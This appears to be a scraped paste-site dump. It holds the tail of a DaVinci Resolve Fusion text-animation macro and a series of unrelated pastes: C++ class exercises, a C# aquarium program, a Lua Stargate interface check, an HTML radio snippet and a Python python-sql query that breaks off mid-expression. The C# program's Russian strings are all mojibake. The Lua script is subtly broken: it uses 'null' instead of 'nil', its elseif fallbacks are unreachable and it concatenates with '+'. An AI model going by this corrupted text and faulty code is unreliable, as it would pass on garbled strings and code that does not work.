					Source = ""Green1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input11 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Blue1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input12 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Alpha1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input13 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Size"",
					Default = 0.0591,
				},
				Input14 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""CharacterSpacingClone"",
					Name = ""Tracking"",
					Default = 1,
				},
				Input15 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""LineSpacingClone"",
					Default = 1,
				},
				Input16 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Strikeout"",
					Name = ""Emphasis"",
					ControlGroup = 9,
				},
				Input17 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Underline"",
					Name = ""Emphasis"",
					ControlGroup = 9,
				},
				Input1 = InstanceInput {
					SourceOp = ""Transform4"",
					Source = ""Center"",
					Name = ""Position"",
				},
				LineColor = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""LineColor"",
					Page = ""Controls"",
				},
				Input2 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftRed"",
					Name = ""Color"",
					ControlGroup = 2,
					Default = 0.8270000219345,
				},
				Input3 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftGreen"",
					ControlGroup = 2,
					Default = 0.5934485793114,
				},
				Input4 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftBlue"",
					ControlGroup = 2,
					Default = 0.1149529963732,
				},
				Input5 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftAlpha"",
					ControlGroup = 2,
					Default = 1,
				}
			},
			Outputs = {
				Output2 = InstanceOutput {
					SourceOp = ""Path5"",
					Source = ""Heading"",
				},
				MainOutput1 = InstanceOutput {
					SourceOp = ""KeyframeStretcher1"",
					Source = ""Result"",
				},
				Output1 = InstanceOutput {
					SourceOp = ""Path6"",
					Source = ""Heading"",
				}
			},
			ViewInfo = GroupInfo {
				Pos = { 220, 49.5 },
				Flags = {
					Expanded = true,
					AllowPan = false,
					ConnectedSnap = true,
					AutoSnap = true,
					RemoveRouters = true
				},
				Size = { 714.18, 414.966, 357.09, 36.2677 },
				Direction = ""Horizontal"",
				PipeStyle = ""Direct"",
				Scale = 1,
				Offset = { 0, 0 }
			},
			Tools = ordered() {
				KeyframeStretcher1 = KeyStretcher {
					Inputs = {
						Keyframes = Input {
							SourceOp = ""Transform4"",
							Source = ""Output"",
						},
						SourceEnd = Input { Value = 125, },
						StretchStart = Input { Value = 46, },
						StretchEnd = Input { Value = 88, },
					},
					ViewInfo = OperatorInfo { Pos = { 294, 329.722 } },
				},
				Transform4 = Transform {
					Inputs = {
						Input = Input {
							SourceOp = ""Merge5"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 144.178, 329.722 } },
				},
				Merge5 = Merge {
					Inputs = {
						Blend = Input {
							SourceOp = ""Merge5Blend"",
							Source = ""Value"",
						},
						Background = Input {
							SourceOp = ""LineColor"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""ChannelBooleans3"",
							Source = ""Output"",
						},
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 329.722 } },
				},
				Merge5Blend = BezierSpline {
					SplineColor = { Red = 205, Green = 205, Blue = 205 },
					CtrlWZoom = false,
					KeyFrames = {
						[17] = { 0, RH = { 23, 0.333333333333333 }, Flags = { Linear = true } },
						[35] = { 1, LH = { 29, 0.666666666666667 }, RH = { 53.3333333333333, 1 }, Flags = { Linear = true } },
						[90] = { 1, LH = { 71.6666666666667, 1 }, RH = { 96, 0.666666666666667 }, Flags = { Linear = true } },
						[108] = { 0, LH = { 102, 0.333333333333333 }, Flags = { Linear = true } }
					}
				},
				ChannelBooleans3 = ChannelBoolean {
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Instance_Text1_1_1_1"",
							Source = ""Output"",
						},
						MultiplyByMask = Input { Value = 1, },
						Background = Input {
							SourceOp = ""Transform3"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -106.23, 329.722 } },
				},
				Instance_Text1_1_1_1 = TextPlus {
					ExtentSet = true,
					SourceOp = ""Text"",
					Inputs = {
						Softness6 = Input { },
						Properties6 = Input { },
						Size6 = Input { },
						Shear6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						EffectMask = Input { },
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled6 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						ClearSelectedKerning = Input { },
						ClearAllKerning = Input { },
						ClearSelectedPlacement = Input { },
						ClearAllPlacement = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties4 = Input { },
						Alpha4 = Input { },
						Softness4 = Input { },
						Position4 = Input { Value = 1, },
						Rotation4 = Input { },
						Shear4 = Input { },
						Size4 = Input { },
						Properties5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
					},
					ViewInfo = OperatorInfo { Pos = { -106.23, 279.425 } },
				},
				LineColor = Background {
					ExtentSet = true,
					NameSet = true,
					CustomData = {
						Settings = {
						}
					},
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Bitmap1"",
							Source = ""Mask"",
						},
						GlobalOut = Input { Value = 500, },
						Width = Input { Value = 1920, },
						Height = Input { Value = 1088, },
						UseFrameFormatSettings = Input { Value = 1, },
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						TopLeftRed = Input { Value = 1, },
						TopLeftBlue = Input { Value = 0.228, },
						LineColor = Input { Value = 1, }
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 250.145 } },
					UserControls = ordered() { LineColor = { INP_Integer = false, LBLC_DropDownButton = true, LINKID_DataType = ""Number"", LBLC_NumInputs = 4, INPID_InputControl = ""LabelControl"", LINKS_Name = ""Line Color"", } }
				},
				Merge4 = Merge {
					Inputs = {
						Background = Input {
							SourceOp = ""ChannelBooleans1"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""ChannelBooleans1"",
							Source = ""Output"",
						},
						FlipHoriz = Input { Value = 1, },
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 160.806 } },
				},
				Transform3 = Transform {
					Inputs = {
						Center = Input {
							SourceOp = ""Path6"",
							Source = ""Position"",
						},
						Input = Input {
							SourceOp = ""Text"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -294.18, 329.722 } },
				},
				Path6 = PolyPath {
					DrawMode = ""InsertAndModify"",
					CtrlWZoom = false,
					Inputs = {
						Displacement = Input {
							SourceOp = ""Path6Displacement"",
							Source = ""Value"",
						},
						PolyLine = Input {
							Value = Polyline {
								Points = {
									{ Linear = true, LockY = true, X = 0, Y = -0.5, RX = 0, RY = 0.166666666666667 },
									{ Linear = true, LockY = true, X = 0, Y = 0, LX = 0, LY = -0.166666666666667 }
								}
							},
						},
					},
				},
				Path6Displacement = BezierSpline {
					SplineColor = { Red = 255, Green = 0, Blue = 255 },
					CtrlWZoom = false,
					KeyFrames = {
						[17] = { 0, RH = { 32.8181818181818, 0 }, Flags = { LockedY = true } },
						[46] = { 1, LH = { 22.6644620811287, 1 }, RH = { 59.9985997676849, 1 }, Flags = { LockedY = true } },
						[88] = { 1, LH = { 74.0014002323151, 1 }, RH = { 97.665699839592, 1 } },
						[117] = { 0, LH = { 107.334300160408, 0 } }
					}
				},
				Text = TextPlus {
					ExtentSet = true,
					NameSet = true,
					Inputs = {
						Offset3 = Input {
							Value = Point {
								X = 0,
								Y = -0.077
							},
						},
						ExtendVertical3 = Input { Value = 0.19, },
						Level3 = Input { Value = 2, },
						ElementShape3 = Input { Value = 2, },
						ExtendHorizontal3 = Input { Value = 1.17, },
						Position3 = Input { Value = 1, },
						GlobalOut = Input { Value = 500, },
						Width = Input { Value = 1920, },
						Height = Input { Value = 1088, },
						UseFrameFormatSettings = Input { Value = 1, },
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						CharacterSpacing = Input { Value = 1.102, },
						SelectElement = Input { Value = 5, },
						Select = Input { Value = 3, },
						Name3 = Input { Value = ""BlackBG Mask"", },
						Name4 = Input { Value = ""Black BG"", },
						Enabled4 = Input { Value = 1, },
						Name5 = Input { Value = ""OrangeMask"", },
						Enabled5 = Input { Value = 1, },
						Name6 = Input { Value = ""Orange"", },
						Enabled6 = Input { Value = 1, },
						Thickness1 = Input { Value = 0.0882, },
						ExtendHorizontal1 = Input { Value = 0.95, },
						ExtendVertical1 = Input { Value = 0.16, },
						Position1 = Input { Value = 1, },
						StyledText = Input { Value = ""Just\nCrop\nIt"", },
						Font = Input { Value = ""Open Sans"", },
						Style = Input { Value = ""Semibold"", },
						Size = Input { Value = 0.0709, },
						VerticalJustificationNew = Input { Value = 3, },
						HorizontalJustificationNew = Input { Value = 3, },
						Level4 = Input { Value = 0, },
						ExtendHorizontal4 = Input { Value = 0.6, },
						ExtendVertical4 = Input { Value = 0.03, },
						Blue4 = Input { Value = 0, },
						Alpha4 = Input { Value = 0.551, },
						Position4 = Input { Value = 1, },
						ElementShape5 = Input { Value = 2, },
						Level5 = Input { Value = 0, },
						ExtendHorizontal5 = Input { Value = 0.59, },
						Red5 = Input { Value = 0, },
						Green5 = Input { Value = 0, },
						Blue5 = Input { Value = 0, },
						Alpha5 = Input { Value = 0, },
						Position5 = Input { Value = 1, },
						ElementShape6 = Input { Value = 2, },
						Level6 = Input { Value = 0, },
						ExtendHorizontal6 = Input { Value = 0.72, },
						ExtendVertical6 = Input { Value = 0.16, },
						Red6 = Input { Value = 0.8270000219345, },
						Green6 = Input { Value = 0.5934485793114, },
						Blue6 = Input { Value = 0.1149529963732, },
					},
					ViewInfo = OperatorInfo { Pos = { -294.18, 89.6366 } },
				},
				Rectangle4 = RectangleMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Center = Input { Value = { 0, 0.5 }, },
						Width = Input { Value = 1, },
						Height = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { 143.402, 100.054 } },
				},
				ChannelBooleans1 = ChannelBoolean {
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Rectangle4"",
							Source = ""Mask"",
						},
						ApplyMaskInverted = Input { Value = 1, },
						MultiplyByMask = Input { Value = 1, },
						Background = Input {
							SourceOp = ""Transform2"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 100.054 } },
				},
				Transform2 = Transform {
					Inputs = {
						Center = Input {
							SourceOp = ""Path5"",
							Source = ""Position"",
						},
						Input = Input {
							SourceOp = ""Instance_Text1_1_1"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 48.5795 } },
				},
				Path5 = PolyPath {
					DrawMode = ""InsertAndModify"",
					CtrlWZoom = false,
					Inputs = {
						Displacement = Input {
							SourceOp = ""Path5Displacement"",
							Source = ""Value"",
						},
						PolyLine = Input {
							Value = Polyline {
								Points = {
									{ Linear = true, LockY = true, X = -0.5, Y = 0, RX = 0.166666666666667, RY = 0 },
									{ Linear = true, LockY = true, X = 0, Y = 0, LX = -0.166666666666667, LY = 0 }
								}
							},
						},
					},
				},
				Path5Displacement = BezierSpline {
					SplineColor = { Red = 255, Green = 0, Blue = 255 },
					CtrlWZoom = false,
					KeyFrames = {
						[2] = { 0, RH = { 18.4040404040404, 0 }, Flags = { LockedY = true } },
						[31] = { 1, LH = { 10.7, 1 }, RH = { 52.6644996404648, 1 }, Flags = { LockedY = true } },
						[96] = { 1, LH = { 74.3355003595352, 1 }, RH = { 105.665699839592, 1 } },
						[125] = { 0, LH = { 115.334300160408, 0 } }
					}
				},
				Instance_Text1_1_1 = TextPlus {
					ExtentSet = true,
					SourceOp = ""Text"",
					Inputs = {
						Shear4 = Input { },
						Position4 = Input { Value = 1, },
						Properties4 = Input { },
						Softness4 = Input { },
						Size4 = Input { },
						Rotation4 = Input { },
						EffectMask = Input {
							SourceOp = ""Rectangle3"",
							Source = ""Mask"",
						},
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled4 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						ClearSelectedKerning = Input { },
						ClearAllKerning = Input { },
						ClearSelectedPlacement = Input { },
						ClearAllPlacement = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
						Properties6 = Input { },
						Red6 = Input { },
						Green6 = Input { },
						Blue6 = Input { },
						Softness6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						Shear6 = Input { },
						Size6 = Input { },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 7.9451 } },
				},
				Rectangle3 = RectangleMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Center = Input { Value = { 0, 0.5 }, },
						Width = Input { Value = 1, },
						Height = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { -132.02, 7.9451 } },
				},
				Instance_Text = TextPlus {
					ExtentSet = true,
					NameSet = true,
					SourceOp = ""Text"",
					Inputs = {
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled4 = Input { },
						Enabled5 = Input { Value = 1, },
						Enabled6 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties4 = Input { },
						Softness4 = Input { },
						Position4 = Input { Value = 1, },
						Rotation4 = Input { },
						Shear4 = Input { },
						Size4 = Input { },
						Properties5 = Input { },
						ExtendHorizontal5 = Input { Value = 0.38, },
						ExtendVertical5 = Input { Value = 1.59, },
						Red5 = Input { Value = 0, },
						Green5 = Input { Value = 0, },
						Blue5 = Input { Value = 0, },
						Alpha5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
						Properties6 = Input { },
						Red6 = Input { },
						Green6 = Input { },
						Blue6 = Input { },
						Softness6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						Shear6 = Input { },
						Size6 = Input { },
						EffectMask = Input { }
					},
					ViewInfo = OperatorInfo { Pos = { -110.669, 112.98 } },
				},
				Bitmap1 = BitmapMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						PaintMode = Input { Value = FuID { ""Subtract"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1088, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""Merge4"",
							Source = ""Output"",
						},
						Channel = Input { Value = FuID { ""Luminance"" }, },
						EffectMask = Input {
							SourceOp = ""Bitmap1_1"",
							Source = ""Mask"",
						}
					},
					ViewInfo = OperatorInfo { Pos = { 15.6112, 205.482 } },
				},
				Bitmap1_1 = BitmapMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1088, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""Instance_Text"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -93.3713, 185.132 } },
				}
			},
		}
	},
	ActiveTool = ""DarkBoxText""
}"
HtCVZx5A,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:41:21 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;


class Animal {
        string sound;
    public:
        Animal(string sound){
            this->sound = sound;
        }
        void makeSound(){
            cout << sound << endl;
        }
};
class Dog : public Animal {
    public:
        Dog(string sound = ""Woof!"")
            :Animal(sound)
        {
        }

};
class Cat : public Animal {
    public:
        Cat(string sound = ""Miaw!"")
            :Animal(sound)
        {
        }
};

int main(){

    Dog dog;
    dog.makeSound();

    Cat cat(""Mew!"");
    cat.makeSound();

    return 0;
}
"
h729yQbe,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:10:25 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;



class Account {
    private:
        double money;
        static int accessCount;

    public:
        Account(){
            //accessCount = 0;
            this->money = 0;
        }
        Account(double money){
            if(money > 0){
                ++accessCount;
                this->money = money;
            } else {
                this->money = 0;
            }
        }

        double in(double money){
            if (money > 0)
                accessCount++;
            //cout << money << "" "" << this->money << "" "" << ::money << endl;
            this->money += money;
            return this->money;
        }

        double out(double money){
            double t = min(money, this->money);
            this->money -= t;
            if(t > 0){
                accessCount++;
            }
            return t;
        }

        double get(){
            return money;
        }

        static int getAccessCount(){
            return accessCount;
        }

        void print(){
            cout << ""Account: "" << money << "" EUR "" << endl;
        }
};
int Account::accessCount = 0;



int main(){

    Account account1(0);
    account1.print();
    double a1 = account1.in(100);
    cout << ""Total "" << a1 << endl;
    account1.print();
    double b1 = account1.out(0);
    cout << ""Took out "" << b1 << endl;
    account1.print();
    cout << ""Total "" << account1.get() << endl;
    cout << ""Total transactions "" << Account::getAccessCount() << endl;

    cout << endl << endl;

    Account account2(0);
    account2.print();
    double a2 = account2.in(100);
    cout << ""Total "" << a2 << endl;
    account2.print();
    double b2 = account2.out(0);
    cout << ""Took out "" << b2 << endl;
    account2.print();
    cout << ""Total "" << account2.get() << endl;
    cout << ""Total transactions "" << Account::getAccessCount() << endl;

    return 0;
}
"
bdCmcdG6,Untitled,_KAGATUN_,C#,Tuesday 23rd of April 2024 10:06:14 AM CDT,"using System;
using System.Collections.Generic;

class Program
{
    static void Main(string[] args)
    {
        const string AddFish = ""1"";
        const string RemoveFish = ""2"";
        const string ExitCommand = ""3"";

        Aquarium aquarium = new Aquarium();

        bool isWork = true;

        while (isWork)
        {
            Console.WriteLine($""–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ —Ä—ã–±–æ–∫ –≤ –∞–∫–≤–∞—Ä–∏—É–º–µ –º–æ–∂–µ—Ç –±—ã—Ç—å {aquarium.Capacity}\n"");

            aquarium.ShowFishes();

            Console.WriteLine($""\n–í–≤–µ–¥–∏—Ç–µ {AddFish} —á—Ç–æ–±—ã –¥–æ–±–∞–≤–∏—Ç—å —Ä—ã–±–∫—É –≤ –∞–∫–≤–∞—Ä–∏—É–º"");
            Console.WriteLine($""\n–í–≤–µ–¥–∏—Ç–µ {RemoveFish} —á—Ç–æ–±—ã —É–±—Ä–∞—Ç—å —Ä—ã–±–∫—É –∏–∑ –∞–∫–≤–∞—Ä–∏—É–º–∞"");
            Console.WriteLine($""\n–í–≤–µ–¥–∏—Ç–µ {ExitCommand} —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É"");

            string userInput = Console.ReadLine();

            Console.Clear();

            switch (userInput)
            {
                case AddFish:
                    aquarium.FillFishes();
                    break;

                case RemoveFish:
                    aquarium.RemoveFish();
                    break;

                case ExitCommand:
                    isWork = false;
                    break;

                default:
                    Console.WriteLine(""\n–ü—Ä–æ—à—ë–ª –≥–æ–¥\n"");
                    break;
            }

            aquarium.AddAgeAll();

            Console.ReadKey();
            Console.Clear();
        }
    }
}

class Fish
{
    public Fish(string name, int maxAge)
    {
        Age = 0;
        Name = name;
        MaxAge = maxAge;
    }

    public string Name { get; protected set; }
    public int MaxAge { get; protected set; }
    public int Age { get; protected set; }

    public bool IsAlive => Age < MaxAge;

    public void ShowInfo()
    {
        Console.WriteLine($""–ù–∞–∑–≤–∞–Ω–∏–µ —Ä—ã–±–∫–∏ {Name}. –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π –≤–æ–∑—Ä–∞—Å—Ç {MaxAge} –ª–µ—Ç."");
    }

    public void ShowFish()
    {
        if (IsAlive)
        {
            Console.WriteLine($""–†—ã–±–∫–µ {Name} –ª–µ—Ç {Age}."");
        }
        else
        {
            Console.WriteLine($""–†—ã–±–∫–∞ {Name} –º–µ—Ä—Ç–≤–∞."");
        }
    }

    public void AddAge()
    {
        Age++;
    }
}

class Cardinal : Fish
{
    public Cardinal() : base(""–ö–∞—Ä–¥–∏–Ω–∞–ª"", 4) { }
}

class Goldfish : Fish
{
    public Goldfish() : base(""–ó–æ–ª–æ—Ç–∞—è —Ä—ã–±–∫–∞"", 30) { }
}

class Severum : Fish
{
    public Severum() : base(""–°–µ–≤–µ—Ä—É–º"", 15) { }
}

class BlackLabeo : Fish
{
    public BlackLabeo() : base(""–ß—ë—Ä–Ω—ã–π –ª–∞–±–µ–æ"", 7) { }
}

class SilverMetynnis : Fish
{
    public SilverMetynnis() : base(""–ú–µ—Ç–∏–Ω–Ω–∏—Å —Å–µ—Ä–µ–±—Ä–∏—Å—Ç—ã–π"", 8) { }
}

class Discus : Fish
{
    public Discus() : base(""–î–∏—Å–∫—É—Å"", 18) { }
}

class Aquarium
{
    private List<Fish> _fishes = new List<Fish>();

    public int Capacity { get; private set; } = 5;

    public void ShowFishes()
    {
        if (_fishes.Count > 0)
        {
            for (int i = 0; i < _fishes.Count; i++)
            {
                _fishes[i].ShowFish();
            }
        }
        else
        {
            Console.WriteLine(""–ê–∫–≤–∞—Ä–∏—É–º –ø—É—Å—Ç–æ–π"");
        }
    }

    public void AddAgeAll()
    {
        for (int i = 0; i < _fishes.Count; i++)
        {
            if (_fishes[i].IsAlive)
            {
                _fishes[i].AddAge();
            }
        }
    }

    public void RemoveFish()
    {
        if (_fishes.Count > 0)
        {
            for (int i = 0; i < _fishes.Count; i++)
            {
                Console.WriteLine((i + 1) + ""‚Ññ "");
                _fishes[i].ShowFish();
            }

            Console.WriteLine(""\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ä—ã–±–∫–∏ –¥–ª—è –µ—ë —É–¥–∞–ª–µ–Ω–∏—è\n"");
            string number = Console.ReadLine();

            int index = ValidateIndex(number, _fishes.Count);

            if (index != -1)
            {
                _fishes.RemoveAt(index - 1);
                Console.WriteLine(""\n–†—ã–±–∫–∞ —É–¥–∞–ª–µ–Ω–∞\n"");
            }            
        }
        else
        {
            Console.WriteLine(""–ê–∫–≤–∞—Ä–∏—É–º –ø—É—Å—Ç–æ–π"");
        }      
    }

    public void FillFishes()
    {
        if (Capacity > _fishes.Count)
        {
            _fishes.Add(FillFish());
            Console.WriteLine(""\n–†—ã–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∞"");
        }
        else
        {
            Console.WriteLine(""–ê–∫–≤–∞—Ä–∏—É–º –∑–∞–ø–æ–ª–Ω–µ–Ω"");
        }
    }

    private Fish FillFish()
    {
        List<Fish> fishes = new List<Fish> 
        {
            new Cardinal (),
            new Goldfish(),
            new Severum(),
            new BlackLabeo(),
            new SilverMetynnis(),
            new Discus() 
        };

        for (int i = 0; i < fishes.Count; i++)
        {
            Console.WriteLine((i + 1) + ""‚Ññ "");
            fishes[i].ShowInfo();
        }

        Fish selectedFish = null;

        Console.WriteLine(""\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ä—ã–±–∫–∏ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è"");

        bool isWorks = true;

        while (isWorks)
        {
            string number = Console.ReadLine();
            int index = ValidateIndex(number, fishes.Count);

            if (index != -1)
            {
                selectedFish = fishes[index - 1];

                return selectedFish;
            }
        }

        return selectedFish;
    }

    private int ValidateIndex(string inputNumber, int maxValue)
    {
        int incorrectNumber = -1;

        if (int.TryParse(inputNumber, out int index))
        {
            if (index > 0 && index <= maxValue)
            {
                return index;
            }
        }

        Console.WriteLine(""\n–†—ã–±–∫–∏ –ø–æ–¥ —Ç–∞–∫–∏–º –Ω–æ–º–µ—Ä–æ–º –Ω–µ—Ç\n"");
        return incorrectNumber;
    }
}

"
eCSWwvLS,sgjourney Stargate Type test,PerryExtra,Lua,Tuesday 23rd of April 2024 10:02:18 AM CDT,"INTERFACE_TYPES = {
    ""basic_interface"",
    ""crystal_interface"",
    ""advanced_crystal_interface""
};

INTERFACE_TYPE = INTERFACE_TYPES[1];
INTERFACE = peripheral.find(INTERFACE_TYPE);
if INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[2];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[3];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = nil;
end

if INTERFACE_TYPE == nil then
    STARGATE_TYPE = nil;
else
    STARGATE_TYPE = INTERFACE.getStargateType();
end

print(""Interface Type : "" + INTERFACE_TYPE);
print(""Stargate Type : "" + STARGATE_TYPE);"
k1zMG0gY,Mad,Unknown_No_1,PHP,Tuesday 23rd of April 2024 09:47:14 AM CDT,palestine
fTPf322t,link input and label,VanoHa,HTML 5,Tuesday 23rd of April 2024 09:44:46 AM CDT,"<div>
  <input type=""radio"" id=""python"" name=""language"" checked>
  <label for=""python"">Python</label>
</div>
<div>
  <input type=""radio"" id=""java"" name=""language"">
  <label for=""java"">Java</label>
</div>"
6xWt8m3Z,python,sergyo,Python,Tuesday 23rd of April 2024 09:41:36 AM CDT,"from sql import Null, Literal, With, Union, Cast, Column, Window, Table
from sql.aggregate import Sum, Min
from sql.operators import Concat, Not
from sql.conditionals import Coalesce, Case
from sql.functions import Round, Position, Substring
from datetime import date

DIGITS = 4
from_date = date(2024, 1, 1)
bunit_load = Table('stock_unit_load')
brline = Table('agro_goods_receipt_line')
breceipt = Table('agro_goods_receipt')

base_query = bunit_load.join(brline, condition=(
        brline.id == bunit_load.goods_receipt_line)
    ).join(breceipt, condition=(breceipt.id == brline.receipt)
    ).select(
        bunit_load.id.as_('received_unit_load'),
        bunit_load.internal_quantity.as_('received_quantity'),
        bunit_load.id.as_('destination_unit_load'),
        bunit_load.internal_quantity.as_('destination_quantity'),
        where=(
            (breceipt.company == 1)
            & (Coalesce(breceipt.effective_date, from_date) > from_date)
            & (
                (bunit_load.sale_line != Null)
                | bunit_load.shipment.like('stock.shipment.in.return,%')
            )
        )
    )


invoice_line = Table('account_invoice_line')
invoice = Table('account_invoice')
saleline2 = Table('sale_line')
sale2 = Table('sale_sale')

invoice_origin_column = Cast(Substring(invoice_line.origin,
        Position(',', invoice_line.origin) + Literal(1)),
        'int')
invoice_query = invoice_line.join(invoice, type_='LEFT', condition=(
            invoice.id == invoice_line.invoice)
    ).join(saleline2, condition=(saleline2.id == invoice_origin_column)
    ).join(sale2, condition=(sale2.id == saleline2.sale)
    ).select(
        invoice_origin_column.as_('sale_line'),
        Sum(invoice_line.unit_price * invoice_line.quantity
            ).as_('amount'),
        Sum(invoice_line.quantity).as_('quantity'),
        Min(invoice.invoice_date).as_('invoice_date_min'),
        where=(
            (Coalesce(invoice.state, 'draft') != 'cancelled')
            & (invoice_line.origin != Null)
            & invoice_line.origin.like('sale.line,%')
